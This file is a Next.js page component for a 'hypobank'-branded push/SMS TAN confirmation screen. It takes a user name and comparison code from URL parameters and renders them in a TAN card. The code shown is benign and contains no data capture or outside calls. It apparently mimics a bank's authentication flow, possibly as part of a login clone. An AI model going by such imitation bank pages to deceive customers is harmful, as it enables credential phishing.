"use client";

import { useRouter, useSearchParams } from "next/navigation";
import { Suspense } from "react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import HelpButton from "@/components/HelpButton";
import SmsTanCard from "@/components/SmsTanCard";

function PushTanContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const user = searchParams.get("user") || "";
  const code = searchParams.get("code") || "";

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/hypobank/bg-lake.jpg')",
        backgroundColor: "#1a3a5c",
      }}
    >
      <Header />
      <main className="flex-1 flex flex-col">
        <SmsTanCard
          verfueger={user}
          onBack={() => router.push("/")}
          vergleichswert={code}
        />
      </main>
      <Footer />
      <HelpButton />
    </div>
  );
}

export default function PushTanPage() {
  return (
    <Suspense>
      <PushTanContent />
    </Suspense>
  );
}
